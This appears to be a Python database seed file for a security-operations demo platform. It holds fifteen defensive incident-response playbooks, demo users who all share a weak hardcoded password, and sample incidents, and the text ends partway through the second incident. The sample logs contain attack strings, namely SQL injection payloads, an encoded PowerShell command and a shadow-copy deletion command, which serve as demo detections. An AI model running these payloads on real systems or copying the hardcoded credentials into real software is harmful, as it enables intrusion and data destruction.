"""
Database Seed Service — Realistic Cybersecurity Telemetry & Initial System State
"""
from datetime import datetime, timedelta, timezone
from sqlalchemy import text
from sqlalchemy.orm import Session
from app.core.security import get_password_hash, hash_api_key
from app.models.user import User
from app.models.incident import Incident
from app.models.ioc import IOC
from app.models.mitre import MitreTechnique
from app.models.ai_analysis import AIAnalysis
from app.models.playbook import Playbook, PlaybookExecution
from app.models.integration import Integration
from app.models.api_key import ApiKey
from app.models.audit_log import AuditLog
from app.models.notification import Notification

PLAYBOOKS_DATA = [
    {
        "name": "Suspicious Login Detection & Response",
        "category": "Identity & Access",
        "severity": "MEDIUM",
        "risk_level": "MEDIUM",
        "operational_impact": "Minimal (Single user session challenge)",
        "required_permissions": ["SOC Analyst", "IAM Admin"],
        "preconditions": ["Target user account active in IdP", "Authentication audit logging enabled"],
        "incident_types": ["Suspicious Login", "Anomalous Authentication", "Account Takeover", "Unusual Login"],
        "description": "Validate authentication telemetry, invalidate active session tokens, flag mandatory credential rotation, and enforce hardware-backed MFA.",
        "steps": [
            {"desc": "Audit 24-hour authentication telemetry across IdP logs (Simulated)", "cmd": "idp-cli audit --user {username} --window 24h", "action_type": "investigation", "estimated_seconds": 3},
            {"desc": "Invalidate active OAuth refresh tokens and terminate concurrent sessions (Simulated)", "cmd": "idp-cli session revoke --user {username} --all", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Flag account for mandatory password reset upon next login (Simulated)", "cmd": "ad-cli user update {username} --pwd-reset-required true", "action_type": "remediation", "estimated_seconds": 3},
            {"desc": "Enforce hardware-backed FIDO2 / WebAuthn policy (Simulated)", "cmd": "idp-cli mfa enforce-policy --user {username} --factor WebAuthn", "action_type": "remediation", "estimated_seconds": 5},
            {"desc": "Scan user mailbox for unauthorized forwarding rules (Simulated)", "cmd": "o365-cli mailbox audit-rules --user {username}", "action_type": "verification", "estimated_seconds": 4},
        ]
    },
    {
        "name": "Brute Force Defense & IP Containment",
        "category": "Identity / Network",
        "severity": "HIGH",
        "risk_level": "HIGH",
        "operational_impact": "Low (Blocks suspect external IP)",
        "required_permissions": ["SOC Analyst", "Perimeter Admin"],
        "preconditions": ["Edge firewall / WAF API accessible", "Authentication telemetry streaming"],
        "incident_types": ["Brute Force", "Credential Stuffing", "Password Spraying"],
        "description": "Mitigate distributed or single-source credential-stuffing by blacklisting offending IPs, engaging temporary lockout, and verifying authentication blast radius.",
        "steps": [
            {"desc": "Blacklist attacking IP at perimeter firewall and WAF (Simulated)", "cmd": "iptables -I INPUT -s {source_ip} -j DROP && waf-cli block-ip --ip {source_ip} --duration 24h", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Cross-reference authentication logs to identify successful logins from attacker IP (Simulated)", "cmd": "grep '{source_ip}' /var/log/auth.log | grep -E 'Accepted|200 OK'", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "Enforce CAPTCHA challenge and temporary lock on targeted accounts (Simulated)", "cmd": "auth-gate set-captcha-threshold --tier aggressive --window 1h", "action_type": "remediation", "estimated_seconds": 4},
            {"desc": "Notify Identity Security on-call with attack vector metrics (Simulated)", "cmd": "pagerduty-cli incident create --title 'Brute Force Blast Radius' --severity P2", "action_type": "notification", "estimated_seconds": 2},
        ]
    },
    {
        "name": "Privilege Escalation Containment",
        "category": "Endpoint / Identity",
        "severity": "CRITICAL",
        "risk_level": "CRITICAL",
        "operational_impact": "High (Strips administrative privilege, terminates processes)",
        "required_permissions": ["Incident Responder", "Domain Admin"],
        "preconditions": ["EDR sensor active on target host", "Domain Controller reachable"],
        "incident_types": ["Privilege Escalation", "UAC Bypass", "Token Impersonation", "Sudo Abuse"],
        "description": "Isolate processes spawned with unauthorized elevated privileges, strip rogue group memberships, and lock down affected administrative credentials.",
        "steps": [
            {"desc": "Terminate unauthorized elevated process tree (Simulated)", "cmd": "taskkill /F /PID {pid} /T || kill -9 {pid}", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Strip rogue memberships from Domain Admins or Local Administrators (Simulated)", "cmd": "net localgroup Administrators {username} /delete", "action_type": "remediation", "estimated_seconds": 4},
            {"desc": "Isolate compromised workstation from internal management VLAN (Simulated)", "cmd": "edr-cli isolate --host {target_system}", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Audit Windows Event Log 4672 and 4728 for privilege escalation indicators (Simulated)", "cmd": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4672,4728} -MaxEvents 50", "action_type": "investigation", "estimated_seconds": 6},
            {"desc": "Force immediate Kerberos Golden/Silver ticket invalidation (Simulated)", "cmd": "klist purge && repadmin /syncall", "action_type": "remediation", "estimated_seconds": 5},
        ]
    },
    {
        "name": "Phishing Triage & Mailbox Quarantine",
        "category": "Messaging / Email",
        "severity": "HIGH",
        "risk_level": "MEDIUM",
        "operational_impact": "Minimal (Quarantines weaponized emails tenant-wide)",
        "required_permissions": ["Email Security Admin", "SOC Analyst"],
        "preconditions": ["Exchange Online / Google Workspace API access configured"],
        "incident_types": ["Phishing", "Spear Phishing", "Malicious Attachment", "Credential Harvester"],
        "description": "Search and purge weaponized phishing emails across all tenant mailboxes, block malicious sender domains/URLs, and verify recipient interactions.",
        "steps": [
            {"desc": "Search tenant-wide for messages matching malicious Message-ID or Subject (Simulated)", "cmd": "o365-sec search-and-purge -Subject '{subject}' -Sender '{sender_email}' -HardDelete", "action_type": "containment", "estimated_seconds": 6},
            {"desc": "Block malicious sender domain and attachment SHA256 at email gateway (Simulated)", "cmd": "mailgateway-cli block-domain --domain {sender_domain} --hash {file_hash}", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Query proxy telemetry for HTTP requests to embedded phishing URLs (Simulated)", "cmd": "proxy-query --destination '{phishing_url}' --timeframe 6h", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "Force password reset and session invalidation for users who clicked (Simulated)", "cmd": "idp-cli session revoke-targeted --users-clicked '{phishing_url}'", "action_type": "remediation", "estimated_seconds": 4},
            {"desc": "Submit weaponized sample to sandbox for detonated payload analysis (Simulated)", "cmd": "cuckoo-submit --file '{attachment_name}' --analysis-profile default", "action_type": "investigation", "estimated_seconds": 8},
        ]
    },
    {
        "name": "Ransomware Host Containment & Recovery",
        "category": "Endpoint / Malware",
        "severity": "CRITICAL",
        "risk_level": "CRITICAL",
        "operational_impact": "Severe (Host network isolation, file restoration)",
        "required_permissions": ["Incident Responder", "Backup Admin"],
        "preconditions": ["EDR agent responsive", "Air-gapped immutable backups verified"],
        "incident_types": ["Ransomware", "LockBit", "BlackCat", "Wiper", "Mass File Encryption"],
        "description": "Rapid host network isolation, ransomware process tree termination, perimeter C2 blacklisting, and immutable backup restoration.",
        "steps": [
            {"desc": "Isolate infected workstation from network (Simulated)", "cmd": "netsh advfirewall set allprofiles state on && netsh interface set interface 'Ethernet' disable", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Kill ransomware process tree (Simulated)", "cmd": "taskkill /F /PID 4832 /T", "action_type": "containment", "estimated_seconds": 2},
            {"desc": "Block C2 IP at perimeter firewall (Simulated)", "cmd": "iptables -I OUTPUT -d 185.220.101.45 -j DROP", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Preserve memory dump for forensic analysis (Simulated)", "cmd": "winpmem_mini_x64.exe memdump.raw", "action_type": "forensics", "estimated_seconds": 7},
            {"desc": "Restore files from clean offline volume shadow (Simulated)", "cmd": "wbadmin start recovery -version:latest -itemType:Volume -items:C: -recoveryTarget:C:", "action_type": "recovery", "estimated_seconds": 12},
        ]
    },
    {
        "name": "Suspicious PowerShell Execution Triage",
        "category": "Endpoint / Execution",
        "severity": "HIGH",
        "risk_level": "HIGH",
        "operational_impact": "Low (Terminates single interpreter process)",
        "required_permissions": ["SOC Analyst", "Endpoint Admin"],
        "preconditions": ["Script Block Logging (Event ID 4104) enabled"],
        "incident_types": ["Suspicious PowerShell", "Obfuscated Command", "Script Execution", "AMSI Bypass"],
        "description": "Analyze obfuscated or base64-encoded PowerShell execution, terminate active malicious interpreters, and block execution hashes.",
        "steps": [
            {"desc": "Dump and de-obfuscate base64 encoded command arguments from Event 4104 (Simulated)", "cmd": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} | Select-Object -First 10 Message", "action_type": "investigation", "estimated_seconds": 4},
            {"desc": "Terminate running PowerShell parent/child process tree (Simulated)", "cmd": "Stop-Process -Id {pid} -Force", "action_type": "containment", "estimated_seconds": 2},
            {"desc": "Inspect script invocation for in-memory AMSI patching attempts (Simulated)", "cmd": "Get-Process -Id {pid} | Select-Object -ExpandProperty Modules | Where-Object {$_.ModuleName -like '*amsi*'}", "action_type": "investigation", "estimated_seconds": 4},
            {"desc": "Add SHA256 script hash to EDR blacklist policy (Simulated)", "cmd": "edr-cli blacklist add --hash {script_hash} --comment 'Malicious PS payload'", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Isolate machine if child network beaconing was observed (Simulated)", "cmd": "edr-cli isolate --host {target_system}", "action_type": "containment", "estimated_seconds": 4},
        ]
    },
    {
        "name": "Command and Control (C2) Communication Blockade",
        "category": "Network / Threat Intel",
        "severity": "CRITICAL",
        "risk_level": "CRITICAL",
        "operational_impact": "Moderate (Blocks outbound routes/domains)",
        "required_permissions": ["Perimeter Admin", "SOC Analyst"],
        "preconditions": ["Internal DNS sinkhole configured", "Border router BGP/ACL access"],
        "incident_types": ["C2 Communication", "Beaconing", "Cobalt Strike", "DNS Tunneling"],
        "description": "Null-route active C2 IPs, sinkhole malicious domains in corporate resolvers, and kill beaconing socket connections on internal endpoints.",
        "steps": [
            {"desc": "Redirect malicious domain to sinkhole address in enterprise DNS (Simulated)", "cmd": "dns-cli sinkhole add --domain {c2_domain} --target 0.0.0.0", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Null-route C2 IP address at perimeter border gateways via BGP (Simulated)", "cmd": "ip route add blackhole {c2_ip}/32", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Identify all internal endpoints with active TCP/TLS sessions to C2 (Simulated)", "cmd": "netstat -ano | findstr {c2_ip} || ss -tap | grep {c2_ip}", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "Isolate identified communicating endpoints pending full triage (Simulated)", "cmd": "edr-cli isolate --group c2-communicating-hosts", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Analyze TLS beaconing jitter and frequency to confirm C2 framework (Simulated)", "cmd": "zeek-cut id.orig_h id.resp_h duration < conn.log | sort | uniq -c", "action_type": "investigation", "estimated_seconds": 6},
        ]
    },
    {
        "name": "Data Exfiltration Interruption",
        "category": "Data Protection / DLP",
        "severity": "CRITICAL",
        "risk_level": "CRITICAL",
        "operational_impact": "High (Severs outbound transfer socket)",
        "required_permissions": ["DLP Admin", "Network Admin", "CISO"],
        "preconditions": ["DLP gateway active", "Egress firewall operational"],
        "incident_types": ["Data Exfiltration", "Sensitive Data Leak", "Mega Upload", "Cloud Egress Anomaly"],
        "description": "Sever high-volume unauthorized outbound data transfers, revoke compromised cloud storage tokens, and determine data blast radius.",
        "steps": [
            {"desc": "Sever outbound network connection and RST active socket on interface (Simulated)", "cmd": "tcpkill -i eth0 host {destination_ip}", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Revoke cloud storage OAuth tokens or AWS IAM access keys used in transfer (Simulated)", "cmd": "aws iam update-access-key --access-key-id {key_id} --status Inactive", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Calculate total exfiltrated byte count via NetFlow telemetry (Simulated)", "cmd": "nfdump -R /var/log/flows 'src ip {source_ip} and dst ip {destination_ip}' -s record/bytes", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "Quarantine affected endpoint to prevent secondary transfer stages (Simulated)", "cmd": "edr-cli isolate --host {target_system}", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "File initial breach notification report with Data Protection Officer (Simulated)", "cmd": "soc-incident notify-dpo --incident {incident_public_id} --scope confidential", "action_type": "notification", "estimated_seconds": 3},
        ]
    },
    {
        "name": "WAF Rule Insertion & SQLi Remediation",
        "category": "Web Application",
        "severity": "CRITICAL",
        "risk_level": "CRITICAL",
        "operational_impact": "Minimal (Inserts WAF rule without service downtime)",
        "required_permissions": ["WAF Engineer", "AppSec Analyst"],
        "preconditions": ["WAF reverse proxy operational", "Web application access logs available"],
        "incident_types": ["SQL Injection", "SQLi", "Web Application Exploit", "Database Exfiltration"],
        "description": "Block attacking IP at WAF, inspect exfiltration logs for database schema disclosure, and deploy parameterized query patch.",
        "steps": [
            {"desc": "Block attacking IP at WAF and perimeter (Simulated)", "cmd": "waf-cli block-ip --ip 45.155.204.127 --duration permanent", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Inspect exfiltrated record count in web logs (Simulated)", "cmd": "grep '45.155.204.127' /var/log/nginx/access.log | awk '{print $9, $10}'", "action_type": "investigation", "estimated_seconds": 4},
            {"desc": "Deploy parameterized query patch (Simulated)", "cmd": "git checkout -b hotfix/sqli-parameterization && git commit -m 'Enforce ORM parameterization'", "action_type": "remediation", "estimated_seconds": 5},
            {"desc": "Run automated regression and penetration test (Simulated)", "cmd": "sqlmap -u 'https://api.prod.company.com/api/v2/users?id=1' --batch", "action_type": "verification", "estimated_seconds": 6},
        ]
    },
    {
        "name": "Distributed Denial of Service (DDoS) Mitigation",
        "category": "Network / Availability",
        "severity": "HIGH",
        "risk_level": "HIGH",
        "operational_impact": "Moderate (May enforce CAPTCHA / rate limits)",
        "required_permissions": ["Network Admin", "Cloudflare/CDN Admin"],
        "preconditions": ["Edge CDN / scrubbing center deployed"],
        "incident_types": ["DDoS", "SYN Flood", "HTTP Flood", "UDP Amplification"],
        "description": "Engage CDN Under-Attack Mode, enforce aggressive rate limiting, drop unauthenticated SYN floods, and engage ISP scrubbing.",
        "steps": [
            {"desc": "Activate CDN Under-Attack mode and Managed Challenge for incoming HTTP requests (Simulated)", "cmd": "cloudflare-cli zones set-security-level --level under_attack", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Enable aggressive rate limiting on targeted public endpoints (Simulated)", "cmd": "waf-cli rate-limit --threshold 100 --window 60s --action block", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Enable SYN cookies and tune TCP backlog on load balancers (Simulated)", "cmd": "sysctl -w net.ipv4.tcp_syncookies=1 && sysctl -w net.ipv4.tcp_max_syn_backlog=4096", "action_type": "remediation", "estimated_seconds": 3},
            {"desc": "Engage upstream ISP BGP Flowspec or scrubbing center to filter volumetric flood (Simulated)", "cmd": "bgp-flowspec announce --match-dest {vip_ip} --action redirect-scrubbing", "action_type": "remediation", "estimated_seconds": 5},
            {"desc": "Monitor edge bandwidth consumption and origin latency until baseline returns (Simulated)", "cmd": "grafana-cli query --dashboard ddos-overview --interval 10s", "action_type": "verification", "estimated_seconds": 4},
        ]
    },
    {
        "name": "Unusual Geographical Login Investigation",
        "category": "Identity / Threat Intel",
        "severity": "MEDIUM",
        "risk_level": "MEDIUM",
        "operational_impact": "Minimal (Out-of-band push verification)",
        "required_permissions": ["SOC Analyst"],
        "preconditions": ["GeoIP database updated", "IdP user contact directory synced"],
        "incident_types": ["Unusual Geo Login", "Impossible Travel", "Foreign IP Access"],
        "description": "Correlate impossible travel velocity against known flight routes, trigger out-of-band mobile challenge, and terminate unauthorized foreign sessions.",
        "steps": [
            {"desc": "Calculate travel velocity between consecutive logins (Simulated)", "cmd": "geo-velocity-calc --ip1 {prev_ip} --ip2 {source_ip} --time-delta {delta_minutes}", "action_type": "investigation", "estimated_seconds": 3},
            {"desc": "Send out-of-band push confirmation prompt to user's registered mobile device (Simulated)", "cmd": "idp-push-verify --user {username} --prompt 'Did you just log in from {country}?'", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "If unconfirmed, revoke authentication session token immediately (Simulated)", "cmd": "idp-cli session revoke --session-id {session_id}", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Apply geofence policy blocking authentication from unapproved geographic region (Simulated)", "cmd": "iam-policy update --geofence-block {country_code} --user {username}", "action_type": "remediation", "estimated_seconds": 4},
            {"desc": "Prompt user for credential rotation upon next trusted authentication (Simulated)", "cmd": "idp-cli user flag-rotation --user {username}", "action_type": "remediation", "estimated_seconds": 2},
        ]
    },
    {
        "name": "Suspicious Cloud Infrastructure Activity",
        "category": "Cloud / DevSecOps",
        "severity": "HIGH",
        "risk_level": "HIGH",
        "operational_impact": "Moderate (Isolates rogue cloud instance)",
        "required_permissions": ["Cloud Security Admin", "IAM Admin"],
        "preconditions": ["AWS CloudTrail / Azure Activity Log enabled", "Cloud CLI configured"],
        "incident_types": ["Cloud Threat", "Unauthorized EC2 Instance", "S3 Bucket Public", "Cryptomining"],
        "description": "Deactivate compromised cloud IAM access keys, isolate rogue VM instances, revert overly permissive security groups, and audit CloudTrail.",
        "steps": [
            {"desc": "Deactivate leaked or compromised IAM access key immediately (Simulated)", "cmd": "aws iam update-access-key --access-key-id {access_key} --status Inactive", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Attach containment security group (deny all) to rogue compute instance (Simulated)", "cmd": "aws ec2 modify-instance-attribute --instance-id {instance_id} --groups sg-containment-deny-all", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Revert unauthorized Security Group ingress rules (0.0.0.0/0 on port 22/3389) (Simulated)", "cmd": "aws ec2 revoke-security-group-ingress --group-id {sg_id} --protocol tcp --port 22 --cidr 0.0.0.0/0", "action_type": "remediation", "estimated_seconds": 3},
            {"desc": "Query CloudTrail for all API actions taken by compromised principal in 48h (Simulated)", "cmd": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=AccessKeyId,AttributeValue={access_key}", "action_type": "investigation", "estimated_seconds": 6},
            {"desc": "Snapshot instance EBS volume for offline forensic disk analysis (Simulated)", "cmd": "aws ec2 create-snapshot --volume-id {volume_id} --description 'Forensic image {incident_public_id}'", "action_type": "forensics", "estimated_seconds": 7},
        ]
    },
    {
        "name": "Unauthorized Configuration Changes",
        "category": "Compliance / Infrastructure",
        "severity": "MEDIUM",
        "risk_level": "MEDIUM",
        "operational_impact": "Low (Rolls back configuration to Git baseline)",
        "required_permissions": ["SysAdmin", "Security Auditor"],
        "preconditions": ["Configuration management (GitOps/Ansible) deployed", "File integrity monitoring active"],
        "incident_types": ["Unauthorized Config", "FIM Alert", "System Tampering", "Policy Drift"],
        "description": "Detect file integrity drift, diff modified configuration against trusted Git repository, restore verified baseline, and lock down file permissions.",
        "steps": [
            {"desc": "Inspect File Integrity Monitoring (FIM) alert to identify modified configuration files (Simulated)", "cmd": "osqueryi \"SELECT * FROM file_events WHERE path LIKE '/etc/%' ORDER BY time DESC LIMIT 10;\"", "action_type": "investigation", "estimated_seconds": 4},
            {"desc": "Diff modified system file against master branch in central Git repository (Simulated)", "cmd": "git diff /etc/{config_file} origin/main:/etc/{config_file}", "action_type": "investigation", "estimated_seconds": 3},
            {"desc": "Roll back configuration file to certified baseline (Simulated)", "cmd": "git checkout origin/main -- /etc/{config_file} && systemctl restart {service_name}", "action_type": "remediation", "estimated_seconds": 4},
            {"desc": "Restrict file permissions and ownership to read-only for service accounts (Simulated)", "cmd": "chmod 644 /etc/{config_file} && chown root:root /etc/{config_file}", "action_type": "remediation", "estimated_seconds": 3},
            {"desc": "Review auditd records for user ID and command that edited the file (Simulated)", "cmd": "ausearch -f /etc/{config_file} -i", "action_type": "investigation", "estimated_seconds": 4},
        ]
    },
    {
        "name": "Pass-the-Hash Containment & Kerberos Purge",
        "category": "Identity & Access",
        "severity": "CRITICAL",
        "risk_level": "CRITICAL",
        "operational_impact": "High (Purges tickets, isolates jump hosts)",
        "required_permissions": ["Domain Admin", "Incident Responder"],
        "preconditions": ["Active Directory domain controllers reachable", "EDR sensor running"],
        "incident_types": ["Lateral Movement", "Pass-the-Hash", "PsExec", "WMI Execution", "Mimikatz"],
        "description": "Isolate compromised pivot host, purge active Kerberos/NTLM tickets, remove malicious persistence tasks, and enable LSA protection.",
        "steps": [
            {"desc": "Isolate compromised host 192.168.1.210 (Simulated)", "cmd": "edr-cli isolate --host WKSTN-DEV-012", "action_type": "containment", "estimated_seconds": 4},
            {"desc": "Purge active Kerberos/NTLM tickets for domain admins (Simulated)", "cmd": "klist purge", "action_type": "remediation", "estimated_seconds": 3},
            {"desc": "Remove malicious scheduled task (Simulated)", "cmd": "schtasks /delete /tn 'WindowsUpdate' /f", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Enable LSA Protection on DCs (Simulated)", "cmd": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f", "action_type": "remediation", "estimated_seconds": 4},
            {"desc": "Initiate dual reset of Active Directory KRBTGT account password (Simulated)", "cmd": "ad-krbtgt-reset --mode immediate --replicate-all", "action_type": "remediation", "estimated_seconds": 8},
        ]
    },
    {
        "name": "Suspicious API Access & Abuse Mitigation",
        "category": "API Security",
        "severity": "HIGH",
        "risk_level": "HIGH",
        "operational_impact": "Low (Revokes specific client token)",
        "required_permissions": ["API Gateway Admin", "SOC Analyst"],
        "preconditions": ["API Gateway logging enabled", "Token revocation service active"],
        "incident_types": ["Suspicious API Access", "API Scraping", "BOLA / IDOR", "Token Leak"],
        "description": "Revoke compromised API client tokens, apply aggressive rate-limiting on calling IP/agent, inspect schema exposure, and rotate credentials.",
        "steps": [
            {"desc": "Revoke compromised bearer token or API key in token cache (Simulated)", "cmd": "redis-cli del 'oauth:token:{token_id}' || api-gw key revoke --id {key_id}", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Apply immediate rate throttle or block on client IP address at API gateway (Simulated)", "cmd": "api-gw rate-limit set --client-ip {source_ip} --limit 0", "action_type": "containment", "estimated_seconds": 3},
            {"desc": "Query gateway access logs to determine full scope of endpoints accessed (Simulated)", "cmd": "grep '{token_id}' /var/log/api-gateway/access.log | jq '{path: .request_path, status: .response_code, bytes: .response_size}'", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "Verify whether sensitive PII or restricted database records were returned in payloads (Simulated)", "cmd": "api-dlp inspect-logs --client-ip {source_ip} --lookback 4h", "action_type": "investigation", "estimated_seconds": 5},
            {"desc": "Issue notification to API consumer / developer to rotate client secrets (Simulated)", "cmd": "notify-devs --client-id {client_id} --reason 'Security Token Revocation'", "action_type": "notification", "estimated_seconds": 3},
        ]
    },
]


def ensure_playbooks(db: Session):
    """Ensure database schema includes structured playbook columns and all 15 playbooks exist."""
    # 1. Migrate SQLite columns safely if needed
    try:
        col_res = db.execute(text("PRAGMA table_info(playbooks)")).fetchall()
        existing_cols = [r[1] for r in col_res] if col_res else []
        if existing_cols:
            if "risk_level" not in existing_cols:
                db.execute(text("ALTER TABLE playbooks ADD COLUMN risk_level VARCHAR(20) DEFAULT 'HIGH'"))
            if "operational_impact" not in existing_cols:
                db.execute(text("ALTER TABLE playbooks ADD COLUMN operational_impact VARCHAR(100) DEFAULT 'Moderate'"))
            if "required_permissions" not in existing_cols:
                db.execute(text("ALTER TABLE playbooks ADD COLUMN required_permissions JSON DEFAULT '[]'"))
            if "preconditions" not in existing_cols:
                db.execute(text("ALTER TABLE playbooks ADD COLUMN preconditions JSON DEFAULT '[]'"))
            if "incident_types" not in existing_cols:
                db.execute(text("ALTER TABLE playbooks ADD COLUMN incident_types JSON DEFAULT '[]'"))
            db.commit()
    except Exception as e:
        print(f"Schema check on playbooks: {e}")

    # 2. Upsert all 15 playbooks
    now = datetime.now(timezone.utc)
    for pb_data in PLAYBOOKS_DATA:
        existing = db.query(Playbook).filter(Playbook.name == pb_data["name"]).first()
        if existing:
            existing.category = pb_data["category"]
            existing.severity = pb_data["severity"]
            existing.risk_level = pb_data.get("risk_level", "HIGH")
            existing.operational_impact = pb_data.get("operational_impact", "Moderate")
            existing.required_permissions = pb_data.get("required_permissions", [])
            existing.preconditions = pb_data.get("preconditions", [])
            existing.incident_types = pb_data.get("incident_types", [])
            existing.description = pb_data["description"]
            existing.steps = pb_data["steps"]
            existing.enabled = True
        else:
            new_pb = Playbook(
                name=pb_data["name"],
                category=pb_data["category"],
                severity=pb_data["severity"],
                risk_level=pb_data.get("risk_level", "HIGH"),
                operational_impact=pb_data.get("operational_impact", "Moderate"),
                required_permissions=pb_data.get("required_permissions", []),
                preconditions=pb_data.get("preconditions", []),
                incident_types=pb_data.get("incident_types", []),
                description=pb_data["description"],
                steps=pb_data["steps"],
                enabled=True,
                created_at=now - timedelta(days=30),
            )
            db.add(new_pb)
    db.commit()


def seed_database(db: Session):
    """Seed database with production-grade demo security records if empty."""
    # Ensure playbooks are always up to date
    ensure_playbooks(db)

    # Check if user data already seeded
    if db.query(User).count() > 0:
        return

    now = datetime.now(timezone.utc)

    # 1. Users
    users_data = [
        {"email": "admin@cybersentinel.ai", "full_name": "Dr. Keanu Makoa", "role": "ADMIN", "password": "Password123!", "mfa": True},
        {"email": "sarah.chen@cybersentinel.ai", "full_name": "Sarah Chen", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "marcus.webb@cybersentinel.ai", "full_name": "Marcus Webb", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "alex.rivera@cybersentinel.ai", "full_name": "Alex Rivera", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "priya.nair@cybersentinel.ai", "full_name": "Priya Nair", "role": "ANALYST", "password": "Password123!", "mfa": True},
        {"email": "viewer@cybersentinel.ai", "full_name": "Yuki Tanaka", "role": "VIEWER", "password": "Password123!", "mfa": False},
    ]
    created_users = {}
    for u in users_data:
        user = User(
            email=u["email"],
            full_name=u["full_name"],
            role=u["role"],
            password_hash=get_password_hash(u["password"]),
            is_active=True,
            mfa_enabled=u["mfa"],
            last_login=now - timedelta(minutes=15),
            created_at=now - timedelta(days=30),
        )
        db.add(user)
        db.flush()
        created_users[u["email"]] = user

    # 3. Incidents & Associated Telemetry
    incidents_data = [
        {
            "public_id": "INC-2024-0847",
            "title": "Ransomware Execution Detected on Finance Workstation",
            "description": "Endpoint protection flagged encrypted file activity consistent with LockBit 3.0 ransomware. Process tree shows PowerShell execution from malicious macro in email attachment.",
            "severity": "CRITICAL",
            "status": "INVESTIGATING",
            "category": "Ransomware",
            "source": "EDR (CrowdStrike)",
            "source_ip": "192.168.10.43",
            "destination_ip": "185.220.101.45",
            "target_system": "WKSTN-FIN-043",
            "assignee": "Sarah Chen",
            "risk_score": 9.8,
            "tags": ["ransomware", "LockBit", "endpoint", "finance"],
            "raw_logs": [
                {"time": "10:02:14", "level": "ERROR", "msg": "Malicious process detected", "detail": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIA..."},
                {"time": "10:02:15", "level": "ERROR", "msg": "File encryption activity", "detail": "Path: C:\\Users\\jsmith\\Documents\\*.docx → *.docx.locked"},
                {"time": "10:02:16", "level": "ERROR", "msg": "C2 connection attempt", "detail": "Outbound: 185.220.101.45:443 (Tor exit node)"},
                {"time": "10:02:17", "level": "WARN", "msg": "Registry modification", "detail": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run → svchost32.exe"},
                {"time": "10:02:18", "level": "ERROR", "msg": "Shadow copy deletion", "detail": "cmd.exe /c vssadmin delete shadows /all /quiet"},
                {"time": "10:02:21", "level": "INFO", "msg": "Process quarantined", "detail": "powershell.exe (PID 4832) terminated by EDR agent"},
            ],
            "detected_at": now - timedelta(minutes=23),
            "created_at": now - timedelta(minutes=23),
            "updated_at": now - timedelta(minutes=8),
            "iocs": [
                {"type": "IP", "value": "185.220.101.45", "confidence": 98.0},
                {"type": "HASH", "value": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "confidence": 95.0},
                {"type": "FILE", "value": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\macro_payload.bin", "confidence": 92.0},
            ],
            "mitre": [
                {"technique_id": "T1059.001", "technique_name": "PowerShell", "tactic": "Execution"},
                {"technique_id": "T1486", "technique_name": "Data Encrypted for Impact", "tactic": "Impact"},
                {"technique_id": "T1490", "technique_name": "Inhibit System Recovery", "tactic": "Impact"},
            ]
        },
        {
            "public_id": "INC-2024-0846",
            "title": "SQL Injection Attack on Customer API",
            "description": "WAF detected a series of SQL injection payloads targeting the /api/v2/users endpoint. Attacker successfully extracted partial user records from staging database.",
            "severity": "CRITICAL",
            "status": "DETECTED",
            "category": "Web Exploit",
            "source": "WAF (Cloudflare)",
            "source_ip": "45.155.204.127",
            "destination_ip": "10.0.4.12",
            "target_system": "api.prod.company.com",
            "assignee": "Marcus Webb",
            "risk_score": 9.2,
            "tags": ["sqli", "web", "data-breach", "api"],
            "raw_logs": [
                {"time": "09:38:22", "level": "WARN", "msg": "SQLi pattern detected", "detail": "GET /api/v2/users?id=1' OR '1'='1"},
                {"time": "09:38:24", "level": "WARN", "msg": "Union-based injection attempt", "detail": "GET /api/v2/users?id=1 UNION SELECT username,password FROM users--"},
                {"time": "09:38:26", "level": "ERROR", "msg": "DB error response leaked", "detail": "HTTP 500: ORA-00907: missing right parenthesis"},
                {"time": "09:38:29", "level": "ERROR", "msg": "Data exfiltration suspected", "detail": "Response body size anomaly: 48KB (avg: 2KB)"},
                {"time": "09:38:33", "level": "INFO", "msg": "IP blocked by WAF rule", "detail": "Rule ID: WAF-SQL-003 | Action: BLOCK | IP: 45.155.204.127"},
            ],
            "detected_at": now - timedelta(minutes=45),
            "created_at": now - timedelta(minutes=45),
            "updated_at": now - timedelta(minutes=45),
            "iocs": [
                {"type": "IP", "value": "45.155.204.127", "confidence": 99.0},
                {"type": "URL", "value": "https://api.prod.company.com/api/v2/users?id=1%27%20OR%201=1", "confidence": 94.0},
            ],
            "mitre": [
                {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
